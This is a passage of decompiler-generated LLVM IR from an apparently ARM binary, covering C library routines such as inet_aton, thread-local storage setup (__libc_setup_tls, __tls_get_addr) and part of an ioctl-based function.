  %v3_18868 = call i32 @ioctl(i32 %v0_18868, i32 21505, i32 %v2_18858)
  store i32 %v3_18868, i32* %r0.global-to-local, align 4
  store i32 %v3_18868, i32* @r5, align 4
  %v2_1886c = icmp eq i32 %v3_18868, 0
  br i1 %v2_1886c, label %dec_label_pc_18874, label %dec_label_pc_188b8

dec_label_pc_18874:                               ; preds = %entry
  %v4_18880 = zext i8 %tmp to i32
  store i32 %v4_18880, i32* @ip, align 4
  %v3_18884 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_18884, i32* @r3, align 4
  %v1_18888 = load i32, i32* @r4, align 4
  %v2_18888 = add i32 %v1_18888, 4
  %v3_18888 = inttoptr i32 %v2_18888 to i32*
  %v0_1888c = load i32, i32* %r1.global-to-local, align 4
  %v1_1888c = load i32, i32* @r4, align 4
  %v2_1888c = add i32 %v1_1888c, 8
  %v3_1888c = inttoptr i32 %v2_1888c to i32*
  store i32 %v0_1888c, i32* %v3_1888c, align 4
  %v0_18890 = load i32, i32* %r0.global-to-local, align 4
  %v1_18890 = load i32, i32* @r4, align 4
  %v2_18890 = add i32 %v1_18890, 12
  %v3_18890 = inttoptr i32 %v2_18890 to i32*
  store i32 %v0_18890, i32* %v3_18890, align 4
  %v2_18894 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_18894, i32* @r1, align 4
  %v1_1889c = load i32, i32* @r4, align 4
  %v2_1889c = inttoptr i32 %v1_1889c to i32*
  store i32 %v3_18884, i32* %v2_1889c, align 4
  %v0_188a0 = load i32, i32* @ip, align 4
  %v1_188a0 = trunc i32 %v0_188a0 to i8
  %v2_188a0 = load i32, i32* @r4, align 4
  %v3_188a0 = add i32 %v2_188a0, 16
  %v4_188a0 = inttoptr i32 %v3_188a0 to i8*
  store i8 %v1_188a0, i8* %v4_188a0, align 1
  %v0_188a4 = load i32, i32* @r4, align 4
  %v1_188a4 = add i32 %v0_188a4, 17
  store i32 %v1_188a4, i32* %r0.global-to-local, align 4
  %v4_188a8 = call i32 @__GI_mempcpy(i32 %v1_188a4, i32 %v2_18894, i32 19, i32 %v3_18884)
  store i32 %v4_188a8, i32* %r0.global-to-local, align 4
  %v0_188ac = load i32, i32* @r5, align 4
  store i32 %v0_188ac, i32* %r1.global-to-local, align 4
  %v3_188b4 = inttoptr i32 %v4_188a8 to i8*
  %v4_188b4 = call i32 @__GI_memset(i8* %v3_188b4, i32 %v0_188ac, i32 13)
  store i32 %v4_188b4, i32* %r0.global-to-local, align 4
  %v0_188b8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_188b8

dec_label_pc_188b8:                               ; preds = %entry, %dec_label_pc_18874
  %v0_188b8 = phi i32 [ %v3_18868, %entry ], [ %v0_188b8.pre, %dec_label_pc_18874 ]
  store i32 %v0_188b8, i32* %r0.global-to-local, align 4
  store i32 %v3_18850, i32* @r4, align 4
  store i32 %v6_18850, i32* @r5, align 4
  store i32 %v9_18850, i32* @r6, align 4
  ret i32 %v0_188b8

; uselistorder directives
  uselistorder i32 %v0_188b8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 17, { 14, 1, 4, 15, 13, 16, 5, 6, 7, 8, 2, 17, 3, 18, 19, 9, 20, 10, 21, 22, 23, 0, 24, 11, 25, 12 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0 }
  uselistorder label %dec_label_pc_188b8, { 1, 0 }
}

define i32 @inet_aton() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_188cc = load i32, i32* @r4, align 4
  store i32 %v3_188cc, i32* %stack_var_-28, align 4
  %v0_188d4 = load i32, i32* @r0, align 4
  %v2_188d4 = icmp eq i32 %v0_188d4, 0
  %v0_188dc = load i32, i32* @r1, align 4
  br i1 %v2_188d4, label %dec_label_pc_189b0, label %dec_label_pc_188e4

dec_label_pc_188e4:                               ; preds = %entry
  br label %dec_label_pc_188fc

dec_label_pc_188fc:                               ; preds = %dec_label_pc_188e4, %dec_label_pc_18974
  %v1_18974 = phi i32 [ 0, %dec_label_pc_188e4 ], [ %v5_18974, %dec_label_pc_18974 ]
  %v0_18978 = phi i32 [ 1, %dec_label_pc_188e4 ], [ %v1_18978, %dec_label_pc_18974 ]
  %v0_188fc = phi i32 [ %v0_188d4, %dec_label_pc_188e4 ], [ %v0_188fc13, %dec_label_pc_18974 ]
  %v1_188fc = inttoptr i32 %v0_188fc to i8*
  %v2_188fc = load i8, i8* %v1_188fc, align 1
  %v3_188fc = zext i8 %v2_188fc to i32
  %v4_18900 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 272) to i32*), align 4
  %v2_18904 = mul nuw nsw i32 %v3_188fc, 2
  %v2_18908 = add i32 %v2_18904, %v4_18900
  %v3_18908 = inttoptr i32 %v2_18908 to i16*
  %v4_18908 = load i16, i16* %v3_18908, align 2
  %v1_1890c = and i16 %v4_18908, 8
  %v2_1890c = icmp eq i16 %v1_1890c, 0
  br i1 %v2_1890c, label %dec_label_pc_189b0, label %dec_label_pc_18914

dec_label_pc_18914:                               ; preds = %dec_label_pc_188fc
  br label %dec_label_pc_18934

dec_label_pc_1891c:                               ; preds = %dec_label_pc_18934
  %v2_1891c = mul i32 %v0_18974, 10
  %v1_18920 = add i32 %v2_1891c, -48
  %v2_18924 = add i32 %v3_18934, %v1_18920
  %v8_1892c = icmp sgt i32 %v2_18924, 255
  br i1 %v8_1892c, label %dec_label_pc_189b0, label %dec_label_pc_18930

dec_label_pc_18930:                               ; preds = %dec_label_pc_1891c
  %v1_18930 = add i32 %v0_18964, 1
  store i32 %v1_18930, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18934

dec_label_pc_18934:                               ; preds = %dec_label_pc_18914, %dec_label_pc_18930
  %v0_18974 = phi i32 [ 0, %dec_label_pc_18914 ], [ %v2_18924, %dec_label_pc_18930 ]
  %v0_18964 = phi i32 [ %v0_188fc, %dec_label_pc_18914 ], [ %v1_18930, %dec_label_pc_18930 ]
  %v1_18934 = inttoptr i32 %v0_18964 to i8*
  %v2_18934 = load i8, i8* %v1_18934, align 1
  %v3_18934 = zext i8 %v2_18934 to i32
  %v2_18938 = mul nuw nsw i32 %v3_18934, 2
  %v2_1893c = add i32 %v2_18938, %v4_18900
  %v3_1893c = inttoptr i32 %v2_1893c to i16*
  %v4_1893c = load i16, i16* %v3_1893c, align 2
  %v6_1893c = zext i16 %v4_1893c to i32
  %v1_18940 = and i32 %v6_1893c, 8
  %v2_18940 = icmp eq i32 %v1_18940, 0
  br i1 %v2_18940, label %dec_label_pc_18948, label %dec_label_pc_1891c

dec_label_pc_18948:                               ; preds = %dec_label_pc_18934
  %v7_18948 = icmp eq i32 %v0_18978, 4
  br i1 %v7_18948, label %dec_label_pc_18960, label %dec_label_pc_18950

dec_label_pc_18950:                               ; preds = %dec_label_pc_18948
  %v7_18950 = icmp eq i8 %v2_18934, 46
  br i1 %v7_18950, label %dec_label_pc_18958, label %dec_label_pc_189b0

dec_label_pc_18958:                               ; preds = %dec_label_pc_18950
  %v1_18958 = add i32 %v0_18964, 1
  store i32 %v1_18958, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18974

dec_label_pc_18960:                               ; preds = %dec_label_pc_18948
  %v2_18960 = icmp eq i8 %v2_18934, 0
  %v1_18964 = add i32 %v0_18964, 1
  store i32 %v1_18964, i32* %r0.global-to-local, align 4
  br i1 %v2_18960, label %dec_label_pc_18974, label %dec_label_pc_1896c

dec_label_pc_1896c:                               ; preds = %dec_label_pc_18960
  %v1_1896c = and i32 %v6_1893c, 32
  %v2_1896c = icmp eq i32 %v1_1896c, 0
  br i1 %v2_1896c, label %dec_label_pc_189b0, label %dec_label_pc_18974

dec_label_pc_18974:                               ; preds = %dec_label_pc_1896c, %dec_label_pc_18960, %dec_label_pc_18958
  %v0_188fc13 = phi i32 [ %v1_18964, %dec_label_pc_1896c ], [ %v1_18964, %dec_label_pc_18960 ], [ %v1_18958, %dec_label_pc_18958 ]
  %v4_18974 = mul i32 %v1_18974, 256
  %v5_18974 = or i32 %v0_18974, %v4_18974
  %v1_18978 = add nuw nsw i32 %v0_18978, 1
  %v7_18980 = icmp slt i32 %v1_18978, 5
  br i1 %v7_18980, label %dec_label_pc_188fc, label %dec_label_pc_18984

dec_label_pc_18984:                               ; preds = %dec_label_pc_18974
  %v2_18984 = icmp eq i32 %v0_188dc, 0
  br i1 %v2_18984, label %.thread8.thread, label %bb

.thread8.thread:                                  ; preds = %dec_label_pc_18984
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_189b4

bb:                                               ; preds = %dec_label_pc_18984
  %v4_18988 = udiv i32 %v5_18974, 16777216
  %v2_1898c = udiv i32 %v5_18974, 256
  %v5_18990 = and i32 %v2_1898c, 65280
  %v2_18994 = and i32 %v5_18974, ptrtoint (i32* @global_var_ff00.32 to i32)
  %v5_18998 = mul i32 %v2_18994, 256
  %v5_1899c = mul i32 %v0_18974, 16777216
  %v6_18990 = or i32 %v4_18988, %v5_1899c
  %v6_18998 = or i32 %v6_18990, %v5_18990
  %v6_1899c = or i32 %v6_18998, %v5_18998
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_189a8 = inttoptr i32 %v0_188dc to i32*
  store i32 %v6_1899c, i32* %v3_189a8, align 4
  %v2_189b4.pre = load i32, i32* %stack_var_-28, align 4
  %v1_189b8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_189b4

dec_label_pc_189b0:                               ; preds = %dec_label_pc_18950, %dec_label_pc_1896c, %dec_label_pc_188fc, %dec_label_pc_1891c, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_189b4

dec_label_pc_189b4:                               ; preds = %.thread8.thread, %bb, %dec_label_pc_189b0
  %v1_189b8 = phi i32 [ %v1_189b8.pre, %bb ], [ 0, %dec_label_pc_189b0 ], [ 1, %.thread8.thread ]
  %v2_189b4 = phi i32 [ %v2_189b4.pre, %bb ], [ %v3_188cc, %dec_label_pc_189b0 ], [ %v3_188cc, %.thread8.thread ]
  store i32 %v2_189b4, i32* @r4, align 4
  ret i32 %v1_189b8

; uselistorder directives
  uselistorder i32 %v1_18978, { 1, 0 }
  uselistorder i32 %v5_18974, { 2, 0, 1, 3 }
  uselistorder i32 %v0_18964, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 6, 3, 4, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_ff00.32 to i32), { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 65280, { 0, 46, 1, 2, 3, 4, 47, 10, 11, 5, 12, 48, 43, 13, 14, 15, 16, 17, 44, 6, 49, 45, 7, 50, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 51, 28, 29, 30, 31, 32, 33, 52, 34, 35, 36, 37, 53, 38, 39, 40, 41, 42, 8, 9 }
  uselistorder i8 46, { 0, 2, 1 }
  uselistorder i32 255, { 19, 20, 0, 1, 2, 23, 25, 24, 21, 26, 27, 5, 22, 28, 7, 29, 6, 4, 8, 9, 30, 3, 31, 10, 13, 14, 12, 15, 11, 16, 17, 18 }
  uselistorder i16 0, { 0, 1, 2, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 5, 17, 6, 18, 19, 20, 21 }
  uselistorder i32 272, { 1, 0 }
  uselistorder label %dec_label_pc_189b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_189b0, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_18934, { 1, 0 }
  uselistorder label %dec_label_pc_188fc, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_189d0 = load i32, i32* @r4, align 4
  store i32 %v3_189d0, i32* %stack_var_-16, align 4
  %v4_189d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_189dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_189e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 36) to i32*), align 4
  store i32 %v4_189e4, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_189ec = inttoptr i32 %v4_189d4 to i32*
  %v2_189ec = load i32, i32* %v1_189ec, align 4
  %v4_189f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 52) to i32*), align 4
  store i32 %v4_189f0, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_189f8 = add i32 %v2_189ec, 15
  %v4_189fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 144) to i32*), align 4
  store i32 %v4_189fc, i32* @ip, align 4
  %v1_18a00 = load i32, i32* @r0, align 4
  %v2_18a00 = add i32 %v1_18a00, %v1_189f8
  %v1_18a04 = inttoptr i32 %v4_189dc to i32*
  %v2_18a04 = load i32, i32* %v1_18a04, align 4
  store i32 %v2_18a04, i32* %r3.global-to-local, align 4
  %v1_18a08 = and i32 %v2_18a00, -16
  store i32 %v1_18a08, i32* %v1_189ec, align 4
  %v0_18a10 = load i32, i32* @r0, align 4
  %v1_18a10 = load i32, i32* %r4.global-to-local, align 4
  %v2_18a10 = inttoptr i32 %v1_18a10 to i32*
  store i32 %v0_18a10, i32* %v2_18a10, align 4
  %v0_18a14 = load i32, i32* @r1, align 4
  %v1_18a14 = load i32, i32* %lr.global-to-local, align 4
  %v2_18a14 = inttoptr i32 %v1_18a14 to i32*
  store i32 %v0_18a14, i32* %v2_18a14, align 4
  %v0_18a18 = load i32, i32* %r3.global-to-local, align 4
  %v1_18a18 = load i32, i32* @ip, align 4
  %v2_18a18 = inttoptr i32 %v1_18a18 to i32*
  store i32 %v0_18a18, i32* %v2_18a18, align 4
  %v2_18a1c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18a1c, i32* %r4.global-to-local, align 4
  %v1_18a20 = load i32, i32* @r0, align 4
  ret i32 %v1_18a20

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
}

define i32 @function_18a28(i32 %arg1) local_unnamed_addr {
dec_label_pc_18a28:
  %v0_18a28 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18a28, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_18a28
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_18a28, %bb
  %v4_18a38 = phi i32 [ %arg1, %dec_label_pc_18a28 ], [ 0, %bb ]
  ret i32 %v4_18a38

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r3.global-to-local, align 4
  %v4_18a4c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 84) to i32*), align 4
  store i32 %v4_18a4c, i32* @lr, align 4
  %v4_18a58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 10744) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 10744), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_18a78 = inttoptr i32 %v4_18a58 to i32*
  store i32 1, i32* %v2_18a78, align 4
  %v0_18a7c = load i32, i32* %r3.global-to-local, align 4
  %v1_18a7c = load i32, i32* @lr, align 4
  %v2_18a7c = inttoptr i32 %v1_18a7c to i32*
  store i32 %v0_18a7c, i32* %v2_18a7c, align 4
  %v0_18a80 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_18a98(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_18a98:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_18a98 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18a98, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_18a98
  %v2_18a98 = load i32, i32* @r4, align 4
  %v8_18a98 = ashr i32 %v2_18a98, %tmp
  %v9_18a98 = and i32 %v8_18a98, %tmp
  %v2_18a9c = load i32, i32* @ip, align 4
  %v8_18a9c = lshr i32 %v2_18a9c, %v9_18a98
  %v9_18a9c = and i32 %v8_18a9c, %v9_18a98
  store i32 %v9_18a9c, i32* %r0.global-to-local, align 4
  %v4_18aa0 = inttoptr i32 %v9_18a9c to i32*
  store i32 %arg2, i32* %v4_18aa0, align 4
  %v5_18aa0 = load i32, i32* @r8, align 4
  %v6_18aa0 = load i32, i32* %r0.global-to-local, align 4
  %v7_18aa0 = sub i32 %v6_18aa0, %v5_18aa0
  store i32 %v7_18aa0, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_18a98, %bb
  %v8_18aa0 = phi i32 [ %tmp, %dec_label_pc_18a98 ], [ %v7_18aa0, %bb ]
  ret i32 %v8_18aa0

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_18aac = call i32 @__aeabi_read_tp()
  %v1_18ab0 = inttoptr i32 %v0_18aac to i32*
  %v2_18ab0 = load i32, i32* %v1_18ab0, align 4
  %v1_18ab4 = add i32 %arg1, 4
  %v2_18ab4 = inttoptr i32 %v1_18ab4 to i32*
  %v3_18ab4 = load i32, i32* %v2_18ab4, align 4
  %v1_18ab8 = add i32 %v2_18ab0, 8
  %v2_18ab8 = inttoptr i32 %v1_18ab8 to i32*
  %v3_18ab8 = load i32, i32* %v2_18ab8, align 4
  %v2_18abc = add i32 %v3_18ab8, %v3_18ab4
  ret i32 %v2_18abc
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_18ac8 = load i32, i32* @r4, align 4
  store i32 %v3_18ac8, i32* %stack_var_-36, align 4
  %v6_18ac8 = load i32, i32* @r5, align 4
  %v15_18ac8 = load i32, i32* @r8, align 4
  %v18_18ac8 = load i32, i32* @sb, align 4
  %v21_18ac8 = load i32, i32* @sl, align 4
  %v24_18ac8 = load i32, i32* @fp, align 4
  %v27_18ac8 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %sl.global-to-local, align 4
  %v4_18ad8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 104) to i32*), align 4
  store i32 %v4_18ad8, i32* %r3.global-to-local, align 4
  %v1_18adc = inttoptr i32 %v4_18ad8 to i32*
  %v2_18adc = load i32, i32* %v1_18adc, align 4
  store i32 %v2_18adc, i32* %r2.global-to-local, align 4
  %v2_18ae0 = icmp eq i32 %v2_18adc, 0
  %v0_18ae8 = load i32, i32* %r0.global-to-local, align 4
  %v0_18aec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_18aec, i32* %ip.global-to-local, align 4
  br i1 %v2_18ae0, label %dec_label_pc_18cb4, label %dec_label_pc_18af4

dec_label_pc_18af4:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_18af8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 156) to i32*), align 4
  store i32 %v4_18af8, i32* @lr, align 4
  store i32 %v2_18adc, i32* %r1.global-to-local, align 4
  %v1_18b40 = inttoptr i32 %v4_18af8 to i32*
  %v2_18b4061 = load i32, i32* %v1_18b40, align 4
  %v4_18b4462 = mul i32 %v2_18b4061, 32
  %v5_18b4463 = add i32 %v4_18b4462, %v2_18adc
  store i32 %v5_18b4463, i32* %r3.global-to-local, align 4
  %v3_18b4865 = icmp ult i32 %v2_18adc, %v5_18b4463
  br i1 %v3_18b4865, label %dec_label_pc_18b04, label %dec_label_pc_18cb4.loopexit

dec_label_pc_18b04:                               ; preds = %dec_label_pc_18af4, %dec_label_pc_18b3c
  %v0_18b1c66 = phi i32 [ %v1_18b3c, %dec_label_pc_18b3c ], [ %v2_18adc, %dec_label_pc_18af4 ]
  %v1_18b04 = inttoptr i32 %v0_18b1c66 to i32*
  %v2_18b04 = load i32, i32* %v1_18b04, align 4
  store i32 %v2_18b04, i32* %r3.global-to-local, align 4
  %v7_18b08 = icmp eq i32 %v2_18b04, 7
  br i1 %v7_18b08, label %dec_label_pc_18b10, label %dec_label_pc_18b3c

dec_label_pc_18b10:                               ; preds = %dec_label_pc_18b04
  %v1_18b10 = add i32 %v0_18b1c66, 20
  %v2_18b10 = inttoptr i32 %v1_18b10 to i32*
  %v3_18b10 = load i32, i32* %v2_18b10, align 4
  store i32 %v3_18b10, i32* %r3.global-to-local, align 4
  %v1_18b14 = add i32 %v0_18b1c66, 28
  %v2_18b14 = inttoptr i32 %v1_18b14 to i32*
  %v3_18b14 = load i32, i32* %v2_18b14, align 4
  store i32 %v3_18b14, i32* @r6, align 4
  %v1_18b1c = add i32 %v0_18b1c66, 16
  %v2_18b1c = inttoptr i32 %v1_18b1c to i32*
  %v3_18b1c = load i32, i32* %v2_18b1c, align 4
  store i32 %v3_18b1c, i32* %r3.global-to-local, align 4
  %v1_18b20 = add i32 %v0_18b1c66, 8
  %v2_18b20 = inttoptr i32 %v1_18b20 to i32*
  %v3_18b20 = load i32, i32* %v2_18b20, align 4
  store i32 %v3_18b20, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_18b14, %v0_18aec
  %v0_18aec.v3_18b14 = select i1 %tmp78, i32 %v0_18aec, i32 %v3_18b14
  store i32 %v0_18aec.v3_18b14, i32* %fp.global-to-local, align 4
  %v2_18b58 = icmp eq i32 %v3_18b14, 0
  br i1 %v2_18b58, label %dec_label_pc_18b80, label %bb

dec_label_pc_18b3c:                               ; preds = %dec_label_pc_18b04
  %v1_18b3c = add i32 %v0_18b1c66, 32
  store i32 %v1_18b3c, i32* %r1.global-to-local, align 4
  %v2_18b40 = load i32, i32* %v1_18b40, align 4
  %v4_18b44 = mul i32 %v2_18b40, 32
  %v5_18b44 = add i32 %v4_18b44, %v2_18adc
  store i32 %v5_18b44, i32* %r3.global-to-local, align 4
  %v3_18b48 = icmp ult i32 %v1_18b3c, %v5_18b44
  br i1 %v3_18b48, label %dec_label_pc_18b04, label %dec_label_pc_18b40.dec_label_pc_18cb4.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_18b10
  %v2_18b5c = add i32 %v3_18b14, -1
  br label %dec_label_pc_18b84

dec_label_pc_18b80:                               ; preds = %dec_label_pc_18b10, %dec_label_pc_18cb4
  %v0_18b94.pre = phi i32 [ %v0_18b94.pre.pre, %dec_label_pc_18cb4 ], [ ptrtoint (i32* @global_var_23010.366 to i32), %dec_label_pc_18b10 ]
  %v1_18b84.pre = phi i32 [ %v1_18b84.pre.pre, %dec_label_pc_18cb4 ], [ %v0_18ae8, %dec_label_pc_18b10 ]
  %v1_18ba825 = phi i32 [ %v0_18cbc, %dec_label_pc_18cb4 ], [ %v0_18aec.v3_18b14, %dec_label_pc_18b10 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_18cb4 ], [ %v3_18b10, %dec_label_pc_18b10 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_18cb4 ], [ %v3_18b1c, %dec_label_pc_18b10 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_18cb4 ], [ %v3_18b20, %dec_label_pc_18b10 ]
  br label %dec_label_pc_18b84

dec_label_pc_18b84:                               ; preds = %bb, %dec_label_pc_18b80
  %storemerge80 = phi i32 [ %v2_18b5c, %bb ], [ 0, %dec_label_pc_18b80 ]
  %v0_18b84 = phi i32 [ %v2_18b5c, %bb ], [ 0, %dec_label_pc_18b80 ]
  %storemerge = phi i32 [ %v3_18b14, %bb ], [ 1, %dec_label_pc_18b80 ]
  %storemerge79 = phi i32 [ %v3_18b14, %bb ], [ 1, %dec_label_pc_18b80 ]
  %v0_18b94 = phi i32 [ ptrtoint (i32* @global_var_23010.366 to i32), %bb ], [ %v0_18b94.pre, %dec_label_pc_18b80 ]
  %v1_18b84 = phi i32 [ %v0_18ae8, %bb ], [ %v1_18b84.pre, %dec_label_pc_18b80 ]
  %v1_18ba8 = phi i32 [ %v0_18aec.v3_18b14, %bb ], [ %v1_18ba825, %dec_label_pc_18b80 ]
  %stack_var_-52.3 = phi i32 [ %v3_18b10, %bb ], [ %stack_var_-52.0, %dec_label_pc_18b80 ]
  %stack_var_-48.3 = phi i32 [ %v3_18b1c, %bb ], [ %stack_var_-48.0, %dec_label_pc_18b80 ]
  %stack_var_-44.3 = phi i32 [ %v3_18b20, %bb ], [ %stack_var_-44.0, %dec_label_pc_18b80 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_18b84 = add i32 %v1_18b84, %v0_18b84
  %v2_18b88 = udiv i32 %v2_18b84, %storemerge
  store i32 %v2_18b88, i32* %r0.global-to-local, align 4
  %v2_18b8c = mul i32 %v2_18b88, %storemerge
  store i32 %v2_18b8c, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_18b94 = add i32 %v0_18b94, 72
  %v3_18b94 = inttoptr i32 %v2_18b94 to i32*
  %v4_18b94 = load i32, i32* %v3_18b94, align 4
  store i32 %v4_18b94, i32* %r3.global-to-local, align 4
  %v1_18b98 = inttoptr i32 %v4_18b94 to i32*
  %v2_18b98 = load i32, i32* %v1_18b98, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_18ba0 = add i32 %v1_18ba8, 1168
  %v2_18ba4 = add i32 %v1_18ba0, %stack_var_-52.3
  %v2_18ba8 = add i32 %v2_18ba4, %v2_18b8c
  %v2_18bac = add i32 %v2_18ba8, %v2_18b98
  store i32 %v2_18bac, i32* %r0.global-to-local, align 4
  %v1_18bb0 = call i32 @__GI_sbrk(i32 %v2_18bac)
  %v1_18bb4 = load i32, i32* %fp.global-to-local, align 4
  %v1_18bbc = sub i32 0, %v1_18bb4
  store i32 10232, i32* %r4.global-to-local, align 4
  %v2_18bb4 = add i32 %v1_18bb0, 1167
  %v1_18bc4 = add i32 %v2_18bb4, %v1_18bb4
  %v2_18bc8 = and i32 %v1_18bc4, %v1_18bbc
  store i32 %v2_18bc8, i32* @r5, align 4
  %v1_18bd0 = load i32, i32* %sl.global-to-local, align 4
  %v3_18bd0 = add i32 %v1_18bd0, 10232
  %v4_18bd0 = inttoptr i32 %v3_18bd0 to i32*
  store i32 62, i32* %v4_18bd0, align 4
  %v0_18bd8 = load i32, i32* @r5, align 4
  %v1_18bd8 = load i32, i32* %sb.global-to-local, align 4
  %v2_18bd8 = add i32 %v1_18bd8, %v0_18bd8
  store i32 %v2_18bd8, i32* @ip, align 4
  %v0_18bdc = load i32, i32* %sl.global-to-local, align 4
  %v1_18bdc = load i32, i32* %r4.global-to-local, align 4
  %v2_18bdc = add i32 %v1_18bdc, %v0_18bdc
  store i32 %v2_18bdc, i32* %r4.global-to-local, align 4
  %v2_18be0 = add i32 %v0_18bdc, 11520
  store i32 %v2_18be0, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_18bd8, i32* @r0, align 4
  %v2_18bf4 = add i32 %v2_18bdc, 16
  %v3_18bf4 = inttoptr i32 %v2_18bf4 to i32*
  store i32 %v2_18bd8, i32* %v3_18bf4, align 4
  %v0_18bf8 = load i32, i32* %sb.global-to-local, align 4
  %v1_18bf8 = load i32, i32* %r8.global-to-local, align 4
  %v2_18bf8 = add i32 %v1_18bf8, 40
  %v3_18bf8 = inttoptr i32 %v2_18bf8 to i32*
  store i32 %v0_18bf8, i32* %v3_18bf8, align 4
  %v0_18bfc = load i32, i32* @r3, align 4
